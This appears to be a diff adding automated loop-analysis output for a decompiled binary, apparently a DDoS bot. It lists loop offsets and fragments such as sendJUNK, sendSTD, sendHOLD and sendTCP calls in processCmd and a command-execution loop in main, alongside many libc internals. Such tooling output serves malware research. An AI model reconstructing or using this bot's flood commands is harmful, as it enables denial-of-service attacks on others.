+		if (listFork() != 0) {
+		sendJUNK(v504, v561, v562);
+		sendSTD(v504, v561, v562);
+		sendHOLD(v504, v561, v562);
+		__libc_close(*(int32_t *)&v483);
+=============================WHILE LOOPS ID : 59 @ processCmd ====================================
+++++++++ WHILE START : 46374 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 46383 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendSTD(v579, v564, v565);
+=============================WHILE LOOPS ID : 60 @ processCmd ====================================
+++++++++ WHILE START : 46451 
+++++++++ WHILE FUNCTION : processCmd 
+++++++++ WHILE END : 46460 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (listFork() != 0) {
+		sendTCP(v584, v508, v569, v570, v571, 0, 10);
+=============================WHILE LOOPS ID : 62 @ getOurIP ====================================
+++++++++ WHILE START : 47585 
+++++++++ WHILE FUNCTION : getOurIP 
+++++++++ WHILE END : 47607 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (strstr(v509, (char *)&v510) != 0) {
+		if (fdgets(v509, 0x1000, v507) == 0) {
+=============================WHILE LOOPS ID : 63 @ main ====================================
+++++++++ WHILE START : 48689 
+++++++++ WHILE FUNCTION : main 
+++++++++ WHILE END : 48957 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		if (strstr(v505, (char *)(*(int32_t *)&v515 - 0x29a4)) == v505) {
+		HackerPrint(*(int32_t *)&v499, (int32_t)&v516);
+		if (strstr(v505, (char *)&v517) == v505) {
+		while (true) {
+		while (true) {
+		while (true) {
+		if (listFork() == 0) {
+		szprintf(v506, (int32_t)&v537, v530);
+		fdpopen(v506, (char *)&v538);
+		while (fdgets(v506, 1024, v506) != 0) {
+		fdpclose(v506);
+		while (true) {
+		processCmd(v539, &v533);
+		free();
+		free();
+=============================WHILE LOOPS ID : 69 @ _vfprintf_internal ====================================
+++++++++ WHILE START : 69923 
+++++++++ WHILE FUNCTION : _vfprintf_internal 
+++++++++ WHILE END : 77507 
+++++++++ INTRESTING INSTRUCTIONS :  
+		case 37: {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		case 0: {
+		while (true) {
+=============================WHILE LOOPS ID : 70 @ _vfprintf_internal ====================================
+++++++++ WHILE START : 77514 
+++++++++ WHILE FUNCTION : _vfprintf_internal 
+++++++++ WHILE END : 78010 
+++++++++ INTRESTING INSTRUCTIONS :  
+		case 37: {
+		while (true) {
+		case 0: {
+		while (true) {
+=============================WHILE LOOPS ID : 75 @ _ppfs_parsespec ====================================
+++++++++ WHILE START : 80810 
+++++++++ WHILE FUNCTION : _ppfs_parsespec 
+++++++++ WHILE END : 81626 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 84 @ strnlen ====================================
+++++++++ WHILE START : 87464 
+++++++++ WHILE FUNCTION : strnlen 
+++++++++ WHILE END : 87556 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 86 @ strstr ====================================
+++++++++ WHILE START : 88098 
+++++++++ WHILE FUNCTION : strstr 
+++++++++ WHILE END : 88193 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 87 @ __xpg_strerror_r ====================================
+++++++++ WHILE START : 89212 
+++++++++ WHILE FUNCTION : __xpg_strerror_r 
+++++++++ WHILE END : 89289 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 91 @ srandom_r ====================================
+++++++++ WHILE START : 113426 
+++++++++ WHILE FUNCTION : srandom_r 
+++++++++ WHILE END : 113461 
+++++++++ INTRESTING INSTRUCTIONS :  
+		__GI_random_r((int32_t *)(8 * v514), v510);
+		__GI_random_r((int32_t *)a2, (int32_t)&v516);
+=============================WHILE LOOPS ID : 98 @ _fpmaxtostr ====================================
+++++++++ WHILE START : 134018 
+++++++++ WHILE FUNCTION : _fpmaxtostr 
+++++++++ WHILE END : 134892 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 104 @ memrchr ====================================
+++++++++ WHILE START : 137339 
+++++++++ WHILE FUNCTION : memrchr 
+++++++++ WHILE END : 137428 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 105 @ __GI_strpbrk ====================================
+++++++++ WHILE START : 138475 
+++++++++ WHILE FUNCTION : __GI_strpbrk 
+++++++++ WHILE END : 138518 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 106 @ inet_aton ====================================
+++++++++ WHILE START : 139035 
+++++++++ WHILE FUNCTION : inet_aton 
+++++++++ WHILE END : 139109 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 107 @ __dns_lookup ====================================
+++++++++ WHILE START : 139672 
+++++++++ WHILE FUNCTION : __dns_lookup 
+++++++++ WHILE END : 140122 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (inet_pton(10, (char *)v526, (int32_t)&v525) < 1) {
+		inet_addr(v526);
+		int32_t v527 = socket(); // 0x419668
+		if (__libc_connect(v527, (struct sockaddr *)28, 28) > -1) {
+		__libc_send(v527, (int32_t *)v494, 0, 0);
+		int32_t v534 = __libc_recv(v527, (int32_t *)v494, 512, 0, (int32_t)&v533); // 0x41973c
+		case 3: {
+		case 0: {
+		while (true) {
+		while (true) {
+		free();
+		free();
+		free();
+		free();
+		case 28: {
+		case 1: {
+		__libc_close(v502);
+		free();
+		free();
+		__libc_close(v502);
+		free();
+		free();
+=============================WHILE LOOPS ID : 108 @ __open_nameservers ====================================
+++++++++ WHILE START : 140678 
+++++++++ WHILE FUNCTION : __open_nameservers 
+++++++++ WHILE END : 140707 
+++++++++ INTRESTING INSTRUCTIONS :  
+		__GI_fclose((int16_t *)v501);
+=============================WHILE LOOPS ID : 109 @ __open_nameservers ====================================
+++++++++ WHILE START : 140719 
+++++++++ WHILE FUNCTION : __open_nameservers 
+++++++++ WHILE END : 140849 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 110 @ _stdio_openlist_dec_use ====================================
+++++++++ WHILE START : 149046 
+++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
+++++++++ WHILE END : 149080 
+++++++++ INTRESTING INSTRUCTIONS :  
+		free();
+=============================WHILE LOOPS ID : 112 @ __GI_fgets_unlocked ====================================
+++++++++ WHILE START : 150204 
+++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
+++++++++ WHILE END : 150253 
+++++++++ INTRESTING INSTRUCTIONS :  
+		int32_t v509 = 0x1000000 * getc_unlocked();
+=============================WHILE LOOPS ID : 115 @ __GI_strncat ====================================
+++++++++ WHILE START : 151368 
+++++++++ WHILE FUNCTION : __GI_strncat 
+++++++++ WHILE END : 151431 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 123 @ __GI_inet_ntop ====================================
+++++++++ WHILE START : 154996 
+++++++++ WHILE FUNCTION : __GI_inet_ntop 
+++++++++ WHILE END : 155249 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 126 @ __read_etc_hosts_r ====================================
+++++++++ WHILE START : 159030 
+++++++++ WHILE FUNCTION : __read_etc_hosts_r 
+++++++++ WHILE END : 159256 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		if (inet_pton(2, (char *)v536, 0) > 0) {
+		while (true) {
+		__GI_fclose((int16_t *)a1);
+=============================WHILE LOOPS ID : 130 @ __length_dotted ====================================
+++++++++ WHILE START : 163757 
+++++++++ WHILE FUNCTION : __length_dotted 
+++++++++ WHILE END : 163787 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
